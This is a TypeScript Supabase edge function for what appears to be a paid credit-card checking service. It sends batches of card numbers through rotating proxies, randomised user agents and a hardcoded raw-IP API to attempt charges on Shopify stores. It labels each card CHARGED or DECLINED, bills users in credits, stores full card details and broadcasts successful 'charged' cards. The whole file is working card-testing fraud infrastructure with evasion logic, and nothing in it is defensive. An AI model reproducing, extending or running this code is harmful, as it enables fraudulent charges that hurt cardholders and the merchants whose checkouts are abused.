import { createClient } from "npm:@supabase/supabase-js@2.90.1";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version",
  "Access-Control-Allow-Methods": "POST, OPTIONS",
};

const SUPABASE_URL = Deno.env.get("SUPABASE_URL") ?? "";
const SUPABASE_ANON_KEY = Deno.env.get("SUPABASE_ANON_KEY") ?? "";
const SUPABASE_SERVICE_ROLE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY") ?? "";
const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
const SHOPIFY_DEBUG_CHAT_ID = "-1003848532661";

const getConfigErrorResponse = () => {
  const missing = [
    ["SUPABASE_URL", SUPABASE_URL],
    ["SUPABASE_ANON_KEY", SUPABASE_ANON_KEY],
    ["SUPABASE_SERVICE_ROLE_KEY", SUPABASE_SERVICE_ROLE_KEY],
  ].filter(([, value]) => !value).map(([name]) => name);

  if (missing.length === 0) return null;

  console.error(`[SHOPIFY-BATCH] Missing required environment variables: ${missing.join(", ")}`);
  return new Response(
    JSON.stringify({ error: "Server configuration error", results: [] }),
    { status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" } }
  );
};

const API_BASE_URL = "http://148.230.102.178:8081/";

const badResponses = [
  "Site not supported",
  "PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH",
  "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED",
  "Payment method not available",
  "ARTIFACT_DISSATISFACTION",
  "VALIDATION_CUSTOM",
];

// Responses that need 3 consecutive hits before removing a site
const strikeResponses = ["MERCHANDISE_EXPECTED_PRICE_MISMATCH"];
const siteStrikeCounter: Record<string, number> = {};
const STRIKE_THRESHOLD = 3;

const userAgents = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
];

const getRandomItem = <T>(arr: T[]): T => arr[Math.floor(Math.random() * arr.length)];

const extractPrice = (response: string): { price: number; priceStr: string } => {
  const pricePatterns = [
    /\$[\d,]+\.?\d*/g,
    /USD\s*[\d,]+\.?\d*/gi,
    /"price":\s*"?[\d.]+/gi,
    /"amount":\s*"?[\d.]+/gi,
    /"total":\s*"?[\d.]+/gi,
  ];
  let lowestPrice = Infinity;
  let priceStr = "$0.00";
  for (const pattern of pricePatterns) {
    const matches = response.match(pattern);
    if (matches) {
      for (const match of matches) {
        const numericMatch = match.replace(/[^0-9.]/g, "");
        const value = parseFloat(numericMatch);
        if (!isNaN(value) && value > 0 && value < lowestPrice) {
          lowestPrice = value;
          priceStr = `$${value.toFixed(2)}`;
        }
      }
    }
  }
  return {
    price: lowestPrice === Infinity ? 0 : lowestPrice,
    priceStr: lowestPrice === Infinity ? "$0.00" : priceStr,
  };
};

// Notify charged card (fire-and-forget)
const notifyChargedCard = (
  userId: string,
  cardDetails: string,
  status: "CHARGED" | "DECLINED" | "UNKNOWN",
  responseMessage: string,
  amount: string,
  gateway: string
) => {
  if (!SUPABASE_SERVICE_ROLE_KEY) return;
  fetch(`${SUPABASE_URL}/functions/v1/notify-charged-card`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Authorization": `Bearer ${SUPABASE_SERVICE_ROLE_KEY}`,
    },
    body: JSON.stringify({
      user_id: userId,
      card_details: cardDetails,
      status,
      response_message: responseMessage,
      amount,
      gateway,
    }),
  }).catch((err) => console.error("[SHOPIFY-BATCH] notify error:", err));
};

const sendAdminDebug = (cc: string, status: string, message: string, rawResponse: string, username?: string, site?: string) => {
  if (!TELEGRAM_BOT_TOKEN) return;
  const maskedCard = cc.replace(/^(\d{6})(\d+)(\d{4})/, '$1******$3');
  const truncatedRaw = rawResponse.length > 1500 ? rawResponse.substring(0, 1500) + '...' : rawResponse;
  const debugMessage = `🔧 <b>SHOPIFY BATCH DEBUG</b>\n\n📇 <b>Card:</b> <code>${maskedCard}</code>\n👤 <b>User:</b> ${username || 'Unknown'}\n🌐 <b>Site:</b> <code>${site || 'N/A'}</code>\n📊 <b>Status:</b> ${status.toUpperCase()}\n💬 <b>Message:</b> ${message}\n\n<pre>${truncatedRaw}</pre>`;
  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: SHOPIFY_DEBUG_CHAT_ID, text: debugMessage, parse_mode: "HTML" }),
  }).catch(() => {});
};

interface CardResult {
  cc: string;
  computedStatus: string;
  apiStatus: string;
  apiMessage: string;
  apiTotal: string;
  rawResponse: string;
  usedSite: string;
  allProxiesDead?: boolean;
}

// Per-fetch timeout & retry tuning (aligned with /sh shopify-charge-check)
const FETCH_TIMEOUT_MS = 12_000;
const UNKNOWN_RETRY_ATTEMPTS = 1;
const MAX_SITE_ATTEMPTS = 3;
const wait = (ms: number) => new Promise((r) => setTimeout(r, ms));

type SiteEntry = { url: string; price: number | null };
type ProxyEntry = { id: string; ip: string; port: string; username: string | null; password: string | null };
type ApiCheckResult = {
  status: string;
  message: string;
  apiResponse: string;
  rawResponse: string;
  price: number;
  priceStr: string;
  proxyDead?: boolean;
  siteDead?: boolean;
};

const formatProxy = (p: ProxyEntry) =>
  p.username && p.password ? `${p.ip}:${p.port}:${p.username}:${p.password}` : `${p.ip}:${p.port}`;

const callApiOnce = async (cc: string, site: string, proxy: string): Promise<ApiCheckResult> => {
  const apiUrl = `${API_BASE_URL}?${encodeURIComponent(cc)}&url=${encodeURIComponent(site)}&proxy=${encodeURIComponent(proxy)}`;

  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), FETCH_TIMEOUT_MS);

  try {
    const response = await fetch(apiUrl, {
      method: 'GET',
      headers: {
        'Accept': 'application/json, text/plain, */*',
        'User-Agent': getRandomItem(userAgents),
        'Cache-Control': 'no-cache',
      },
      signal: controller.signal,
    });
    clearTimeout(timeoutId);
    const rawText = await response.text();

    if (!rawText || rawText.trim() === '') {
      return { status: 'unknown', message: 'Empty response', apiResponse: '', rawResponse: '', price: 0, priceStr: '$0.00', siteDead: true };
    }

    const rawLower = rawText.toLowerCase();

    // Proxy errors
    let isValidApiResponseEarly = false;
    try {
      const parsed = JSON.parse(rawText);
      if (parsed && (parsed.Gateway || parsed.Response || parsed.Price !== undefined || parsed.status || parsed.message || parsed.Charged !== undefined)) {
        isValidApiResponseEarly = true;
      }
    } catch { /* not JSON */ }

    const isProxyError = !isValidApiResponseEarly && (
      rawLower.includes('407') || rawLower.includes('proxy error') ||
      rawLower.includes('proxy authentication') || rawLower.includes('connection refused') ||
      rawLower.includes('proxy connect') || rawLower.includes('tunneling socket') ||
      rawLower.includes('missing proxy param') || rawLower.includes('"error_code":"proxy dead"')
    );
    if (isProxyError) {
      return { status: 'unknown', message: 'Proxy dead', apiResponse: '', rawResponse: rawText, price: 0, priceStr: '$0.00', proxyDead: true };
    }

    // DELIVERY_ADDRESS — declined
    if (rawText.includes('DELIVERY_ADDRESS')) {
      return { status: 'dead', message: 'DELIVERY_ADDRESS error - Declined', apiResponse: 'DELIVERY_ADDRESS', rawResponse: rawText, price: 0, priceStr: '$0.00' };
    }

    // Strike responses (site issue, returned as siteDead so caller can rotate site)
    const matchedStrike = strikeResponses.find(s => rawLower.includes(s.toLowerCase()));
    if (matchedStrike) {
      return { status: 'unknown', message: `${matchedStrike} - site issue`, apiResponse: matchedStrike, rawResponse: rawText, price: 0, priceStr: '$0.00', siteDead: true };
    }

    const isBadResponse = badResponses.some(bad => rawLower.includes(bad.toLowerCase()));
    if (isBadResponse) {
      return { status: 'unknown', message: 'Bad response - site issue', apiResponse: '', rawResponse: rawText, price: 0, priceStr: '$0.00', siteDead: true };
    }

    let { price, priceStr } = extractPrice(rawText);
    let apiStatus = 'unknown';
    let apiMessage = '';
    let apiResponse = '';

    const isEmptyOrErrorOnly = (text: string): boolean => {
      const trimmed = text.trim().toLowerCase();
      return !trimmed || trimmed === 'error:' || trimmed === 'error' || trimmed === 'error: ' || trimmed.length < 3;
    };

    try {
      const json = JSON.parse(rawText);
      if (json.Price !== undefined && json.Price !== null && json.Price !== '?') {
        const parsedPrice = typeof json.Price === 'number' ? json.Price : parseFloat(String(json.Price).replace(/[^0-9.]/g, ''));
        if (!isNaN(parsedPrice) && parsedPrice > 0) { price = parsedPrice; priceStr = `$${parsedPrice.toFixed(2)}`; }
      }
      if (json.Response) { apiResponse = String(json.Response).replace(/<[^>]*>/g, ''); }
      apiMessage = json.Response || json.message || json.msg || json.error || '';

      const responseText = (apiResponse || apiMessage || '').trim();
      const chargedFlag = String(json.Charged ?? json.Charge ?? '').toLowerCase() === 'true' || json.Charged === true || json.Charge === true;
      const chargedFalse = String(json.Charged ?? json.Charge ?? '').toLowerCase() === 'false' || json.Charged === false || json.Charge === false;
      const approvedFlag = String(json.Approved ?? '').toLowerCase() === 'true' || json.Approved === true;

      if (chargedFlag || approvedFlag || json.status === 'CHARGED' || json.status === 'success' || json.full_response === true) {
        apiStatus = 'live'; apiMessage = json.Response || json.message || 'Charged';
      } else if (chargedFalse || String(json.Approved ?? '').toLowerCase() === 'false' || json.status === 'DECLINED' || json.status === 'failed' || json.full_response === false || json.status === 'DS_REQUIRED' || json.status === '3DS_REQUIRED') {
        apiStatus = 'dead'; apiMessage = json.Response || json.message || json.error || 'Declined';
      } else if (isEmptyOrErrorOnly(responseText) && price === 0) {
        apiStatus = 'unknown';
      } else if (json.status === 'error') {
        const errMsg = (json.message || json.error || '').trim().toLowerCase();
        if (errMsg && errMsg !== 'error:' && errMsg !== 'error' && errMsg.length > 5) {
          apiStatus = 'dead'; apiMessage = json.message || json.error || 'Declined';
        } else {
          apiStatus = 'unknown'; apiMessage = 'Request failed';
        }
      } else {
        const lower = String(apiMessage).toLowerCase();
        const responseLower = (apiResponse || '').toLowerCase();
        const combinedText = lower + ' ' + responseLower;
        if (combinedText.includes('order_placed') || combinedText.includes('order placed') || combinedText.includes('thank you') || combinedText.includes('charged') || combinedText.includes('success') || combinedText.includes('approved')) {
          apiStatus = 'live';
        } else if (combinedText.includes('declined') || combinedText.includes('invalid') || combinedText.includes('expired') || combinedText.includes('insufficient') || combinedText.includes('card_declined') || combinedText.includes('incorrect') || combinedText.includes('do_not_honor') || combinedText.includes('fraud') || combinedText.includes('not accepted') || combinedText.includes('ds_required') || combinedText.includes('3ds') || combinedText.includes('3d_secure') || combinedText.includes('rejected') || combinedText.includes('pickup_card') || combinedText.includes('lost_card') || combinedText.includes('stolen_card') || combinedText.includes('restricted') || combinedText.includes('not_permitted') || combinedText.includes('generic_decline')) {
          apiStatus = 'dead';
        } else if (combinedText.includes('failed') || combinedText.includes('error')) {
          const substantive = combinedText.replace(/error:?\s*/g, '').replace(/failed:?\s*/g, '').trim();
          if (substantive.length > 3) apiStatus = 'dead';
        }
      }
    } catch {
      const lower = rawText.toLowerCase();
      if (isEmptyOrErrorOnly(lower)) {
        apiStatus = 'unknown';
      } else if (lower.includes('order_placed') || lower.includes('charged') || lower.includes('success') || lower.includes('approved')) {
        apiStatus = 'live';
      } else if (lower.includes('declined') || lower.includes('invalid') || lower.includes('expired') || lower.includes('insufficient') || lower.includes('ds_required') || lower.includes('3ds') || lower.includes('rejected')) {
        apiStatus = 'dead';
      } else if (lower.includes('failed') || lower.includes('error')) {
        const substantive = lower.replace(/error:?\s*/g, '').replace(/failed:?\s*/g, '').trim();
        if (substantive.length > 3) apiStatus = 'dead';
      }
    }

    return { status: apiStatus, message: apiMessage, apiResponse: apiResponse || apiMessage, rawResponse: rawText, price, priceStr };
  } catch (error) {
    clearTimeout(timeoutId);
    const errMsg = error instanceof Error ? error.message : 'Error';
    const isTimeout = errMsg.toLowerCase().includes('abort') || errMsg.toLowerCase().includes('timeout');
    return {
      status: 'unknown',
      message: isTimeout ? 'Timeout' : errMsg,
      apiResponse: '',
      rawResponse: errMsg,
      price: 0,
      priceStr: '$0.00',
      siteDead: isTimeout,
    };
  }
};

const tryWithRetry = async (cc: string, site: string, proxy: string): Promise<ApiCheckResult> => {
  let result = await callApiOnce(cc, site, proxy);
  if (result.proxyDead || result.siteDead) return result;
  if (result.status === 'live' || result.status === 'dead') return result;
  for (let retry = 1; retry <= UNKNOWN_RETRY_ATTEMPTS; retry++) {
    await wait(250 + Math.floor(Math.random() * 200));
    result = await callApiOnce(cc, site, proxy);
    if (result.proxyDead || result.siteDead) return result;
    if (result.status === 'live' || result.status === 'dead') return result;
  }
  return result;
};

// Check a single card against the Shopify API with site + proxy rotation
const checkSingleCard = async (
  cc: string,
  sites: SiteEntry[],
  proxies: ProxyEntry[],
  adminClient: ReturnType<typeof createClient>,
  userId: string,
  username: string | null,
  shouldNotify = true,
): Promise<CardResult> => {
  if (proxies.length === 0) {
    const fallbackSite = getRandomItem(sites);
    return {
      cc, computedStatus: 'unknown', apiStatus: 'UNKNOWN',
      apiMessage: 'Proxy required — add at least one proxy to use Shopify Charge',
      apiTotal: 'N/A', rawResponse: '', usedSite: fallbackSite.url, allProxiesDead: true,
    };
  }

  // Shuffle sites + proxies for fairness
  const shuffledSites = [...sites].sort(() => Math.random() - 0.5);
  const shuffledProxies = [...proxies].sort(() => Math.random() - 0.5);
  const failedProxyIds: string[] = [];
  const deadSiteUrls: string[] = [];

  let result: ApiCheckResult | null = null;
  let usedSite: SiteEntry = shuffledSites[0];
  const maxSiteAttempts = Math.min(MAX_SITE_ATTEMPTS, shuffledSites.length);

  for (let siteAttempt = 0; siteAttempt < maxSiteAttempts; siteAttempt++) {
    const currentSite = shuffledSites[siteAttempt];
    usedSite = currentSite;

    const availableProxies = shuffledProxies.filter(p => !failedProxyIds.includes(p.id));
    if (availableProxies.length === 0) {
      result = { status: 'unknown', message: 'All proxies failed', apiResponse: '', rawResponse: '', price: 0, priceStr: '$0.00', proxyDead: true };
      break;
    }

    let siteResult: ApiCheckResult | null = null;
    for (const proxy of availableProxies) {
      const r = await tryWithRetry(cc, currentSite.url, formatProxy(proxy));
      if (r.proxyDead) {
        failedProxyIds.push(proxy.id);
        continue;
      }
      siteResult = r;
      break;
    }

    if (!siteResult) {
      // every proxy was dead this round — try next site
      continue;
    }

    // Live/dead = definitive
    if (siteResult.status === 'live' || siteResult.status === 'dead') {
      result = siteResult;
      break;
    }

    // Unknown / siteDead → rotate to next site
    if (siteResult.siteDead) {
      deadSiteUrls.push(currentSite.url);
    }
    result = siteResult;
  }

  if (!result) {
    result = { status: 'unknown', message: 'No usable site/proxy', apiResponse: '', rawResponse: '', price: 0, priceStr: '$0.00' };
  }

  // Cleanup proxies + dead sites in background
  if (failedProxyIds.length > 0) {
    for (const proxyId of failedProxyIds) {
      adminClient.from('user_proxies').delete().eq('id', proxyId).then(() => {});
    }
  }
  for (const deadUrl of deadSiteUrls) {
    adminClient.from('gateway_urls').delete().eq('url', deadUrl).then(() => {});
  }

  // Strike counter management for matched strike on the final used site
  const rawLower = (result.rawResponse || '').toLowerCase();
  const matchedStrike = strikeResponses.find(s => rawLower.includes(s.toLowerCase()));
  if (matchedStrike) {
    const key = usedSite.url;
    siteStrikeCounter[key] = (siteStrikeCounter[key] || 0) + 1;
    if (siteStrikeCounter[key] >= STRIKE_THRESHOLD) {
      adminClient.from('gateway_urls').delete().eq('url', key).then(() => {});
      delete siteStrikeCounter[key];
    }
  } else if (siteStrikeCounter[usedSite.url]) {
    delete siteStrikeCounter[usedSite.url];
  }

  // Update site price if valid
  if (result.price > 0) {
    if (result.price > 100) {
      adminClient.from('gateway_urls').delete().eq('url', usedSite.url).then(() => {});
    } else if (result.price !== Number(usedSite.price)) {
      adminClient.from('gateway_urls').update({ price: result.price }).eq('url', usedSite.url).then(() => {});
    }
  }

  // Map status
  let computedStatus: string;
  let displayStatus: string;
  if (result.status === 'live') { computedStatus = 'live'; displayStatus = 'CHARGED'; }
  else if (result.status === 'dead') { computedStatus = 'dead'; displayStatus = 'DECLINED'; }
  else { computedStatus = 'unknown'; displayStatus = 'UNKNOWN'; }

  const chargeAmount = result.price > 0 ? result.priceStr : (usedSite.price ? `$${Number(usedSite.price).toFixed(2)}` : 'Auto');

  // Admin debug for non-dead / suspicious results
  const isSuspiciousError = result.status === 'dead' &&
    (result.apiResponse || result.message || '').trim().toLowerCase() === 'error:' &&
    result.price === 0;
  if (result.status !== 'dead' || isSuspiciousError) {
    sendAdminDebug(cc, isSuspiciousError ? 'suspicious' : result.status, result.apiResponse || result.message, result.rawResponse, username || undefined, usedSite.url);
  }

  // Broadcast CHARGED cards
  if (shouldNotify && result.status === 'live') {
    notifyChargedCard(userId, cc, 'CHARGED', result.message, chargeAmount, 'Shopify Charge');
  }

  const allProxiesDead = failedProxyIds.length >= proxies.length;

  return {
    cc,
    computedStatus,
    apiStatus: displayStatus,
    apiMessage: result.apiResponse || result.message,
    apiTotal: chargeAmount,
    rawResponse: result.rawResponse,
    usedSite: usedSite.url,
    allProxiesDead,
  };
};

Deno.serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  const configErrorResponse = getConfigErrorResponse();
  if (configErrorResponse) return configErrorResponse;

  try {
    const authHeader = req.headers.get("Authorization");
    if (!authHeader?.startsWith("Bearer ")) {
      return new Response(JSON.stringify({ error: "Unauthorized" }),
        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    const body = await req.json();
    const { cards, priceGroup, userId: bodyUserId, skipAccounting } = body;

    if (!cards || !Array.isArray(cards) || cards.length === 0) {
      return new Response(JSON.stringify({ error: 'Cards array required', results: [] }),
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
    }

    if (cards.length === 1 && String(cards[0]).startsWith('warmup')) {
      return new Response(JSON.stringify({ status: 'ok', warmup: true, results: [] }),
        { headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
    }

    // Accept up to 50 cards per batch (50-thread concurrency model)
    const requestedBatch = cards.slice(0, 50);

    // Admin client is used for credit enforcement, logging, proxy cleanup and site rotation.
    const adminClient = createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY);

    const bearer = authHeader.slice(7).trim();
    const isServiceRoleCall = !!SUPABASE_SERVICE_ROLE_KEY && bearer === SUPABASE_SERVICE_ROLE_KEY && typeof bodyUserId === 'string' && bodyUserId.length > 0;
    const bypassAccounting = isServiceRoleCall && skipAccounting === true;

    let user: { id: string } | null = null;
    if (isServiceRoleCall) {
      user = { id: bodyUserId };
    } else {
      // Auth - done ONCE for the entire batch
      const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
        global: { headers: { Authorization: authHeader } },
      });

      const { data: { user: authUser }, error: authError } = await supabase.auth.getUser();
      if (authError || !authUser) {
        return new Response(JSON.stringify({ error: "Invalid token" }),
          { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }
      user = { id: authUser.id };
    }

    const { data: profile } = await adminClient
      .from("profiles")
      .select("is_banned, username, credits")
      .eq("user_id", user.id)
      .single();

    if (profile?.is_banned) {
      return new Response(JSON.stringify({ error: "Account suspended" }),
        { status: 403, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // Fetch sites and proxies ONCE for the entire batch

    let sitesQuery = adminClient
      .from('gateway_urls')
      .select('url, price')
      .not('url', 'like', 'https://razorpay.me/%')
      .lte('price', 100);

    if (priceGroup && typeof priceGroup.min === 'number' && typeof priceGroup.max === 'number') {
      sitesQuery = sitesQuery.gte('price', priceGroup.min);
      if (priceGroup.max < 100) {
        sitesQuery = sitesQuery.lt('price', priceGroup.max);
      }
    }

    let { data: sites, error: sitesError } = await sitesQuery.order('created_at', { ascending: false });

    // Fallback: if price-group filter yielded no sites, retry without the price-group filter
    if ((!sites || sites.length === 0) && priceGroup) {
      console.log('[SHOPIFY-BATCH] Price-group filter returned 0 sites, falling back to all sites <= $100');
      const fallback = await adminClient
        .from('gateway_urls')
        .select('url, price')
        .not('url', 'like', 'https://razorpay.me/%')
        .lte('price', 100)
        .order('created_at', { ascending: false });
      sites = fallback.data;
      sitesError = fallback.error;
    }

    if (sitesError || !sites || sites.length === 0) {
      return new Response(JSON.stringify({ error: 'No Shopify sites available', results: [] }),
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
    }

    const availableCredits = Math.max(0, Number(profile?.credits || 0));
    if (!bypassAccounting && availableCredits < 1) {
      return new Response(JSON.stringify({ error: 'Insufficient credits', results: [], newCredits: availableCredits }),
        { status: 402, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
    }

    const batch = bypassAccounting ? requestedBatch : requestedBatch.slice(0, Math.min(requestedBatch.length, availableCredits));
    let runningCredits = bypassAccounting ? availableCredits : availableCredits - batch.length;
    if (!bypassAccounting) {
      const { data: debitProfile, error: debitError } = await adminClient
        .from('profiles')
        .update({ credits: runningCredits })
        .eq('user_id', user.id)
        .gte('credits', batch.length)
        .select('credits')
        .single();

      if (debitError || !debitProfile) {
        return new Response(JSON.stringify({ error: 'Insufficient credits', results: [], newCredits: availableCredits }),
          { status: 402, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
      }

      runningCredits = Number(debitProfile.credits || runningCredits);
    }

    const { data: userProxies } = await adminClient
      .from('user_proxies')
      .select('*')
      .eq('user_id', user.id);

    // Fallback: if user has no proxies, use shared admin proxy pool (status='live')
    let effectiveProxies: any[] = userProxies || [];
    if (effectiveProxies.length === 0) {
      console.log('[SHOPIFY-BATCH] No user proxies, falling back to shared proxy pool');
      const { data: sharedProxies } = await adminClient
        .from('proxies')
        .select('id, ip, port, username, password')
        .eq('status', 'live');
      effectiveProxies = sharedProxies || [];
    }

    // Process ALL cards in parallel (up to 50 concurrent threads).
    // Settle-based: return as soon as 49/50 (or all) finish; orphan promises continue in background.
    const COMPLETION_THRESHOLD = Math.max(1, batch.length - 1); // 49 of 50, or N-1 of N

    const tasks = batch.map((cc, idx) =>
      checkSingleCard(cc, sites, effectiveProxies, adminClient, user.id, profile?.username || null, !bypassAccounting)
        .then((r) => ({ idx, r }))
        .catch((err) => ({
          idx,
          r: {
            cc,
            computedStatus: 'unknown',
            apiStatus: 'UNKNOWN',
            apiMessage: err instanceof Error ? err.message : 'Error',
            apiTotal: 'N/A',
            rawResponse: '',
            usedSite: '',
          } as CardResult,
        }))
    );

    const results: CardResult[] = new Array(batch.length);
    let done = 0;
    await new Promise<void>((resolve) => {
      let resolved = false;
      const finish = () => { if (!resolved) { resolved = true; resolve(); } };
      tasks.forEach((t) => {
        t.then(({ idx, r }) => {
          results[idx] = r;
          done++;
          if (done >= COMPLETION_THRESHOLD) finish();
        });
      });
      // Hard ceiling so we never hold the response open beyond edge runtime
      setTimeout(finish, 120_000);
    });

    const completedResults = results.filter(Boolean);
    const liveCount = completedResults.filter((r) => r.computedStatus === 'live').length;
    if (!bypassAccounting && liveCount > 0) {
      const { data: liveDebitProfile } = await adminClient
        .from('profiles')
        .update({ credits: Math.max(0, runningCredits - liveCount) })
        .eq('user_id', user.id)
        .select('credits')
        .single();
      runningCredits = Number(liveDebitProfile?.credits ?? Math.max(0, runningCredits - liveCount));
    }

    if (!bypassAccounting && completedResults.length > 0) {
      const checkRows = completedResults.map((r) => ({
        user_id: user.id,
        gateway: 'shopify_charge',
        status: 'completed',
        result: r.computedStatus,
        card_details: r.cc,
      }));
      adminClient.from('card_checks').insert(checkRows).then(() => {});
    }

    // Fill any still-pending slots with a placeholder so client sees stable length
    for (let i = 0; i < batch.length; i++) {
      if (!results[i]) {
        results[i] = {
          cc: batch[i],
          computedStatus: 'unknown',
          apiStatus: 'UNKNOWN',
          apiMessage: 'Pending — still processing',
          apiTotal: 'N/A',
          rawResponse: '',
          usedSite: '',
        } as CardResult;
      }
    }

    return new Response(
      JSON.stringify({ results, newCredits: runningCredits, chargedExtra: liveCount }),
      { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );

  } catch (error) {
    const msg = error instanceof Error ? error.message : 'Error';
    return new Response(JSON.stringify({ error: msg, results: [] }),
      { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
  }
});
